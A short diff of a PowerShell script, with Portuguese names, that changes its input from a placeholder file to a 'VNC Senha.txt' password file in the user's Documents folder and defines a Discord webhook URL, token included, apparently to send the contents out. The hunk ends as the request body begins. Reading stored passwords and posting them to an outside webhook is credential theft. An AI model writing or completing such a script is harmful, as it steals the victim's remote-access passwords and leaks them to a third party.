@@ -1,4 +1,4 @@
-$conteudo = Get-Content -Path "C:\Exemplo\arquivo.txt"
+$conteudo = Get-Content -Path "USERPROFILE\Documents\VNC Senha.txt"
 $webhookUrl = "https://discord.com/api/webhooks/1186839699998900224/maAvNFQo7zAuyMb1LUTewrGxSEXMW8XO2iqSgvngflsXlMSJ-ZhErKINHUHfCA5z0pv_"
 
 $body = @{
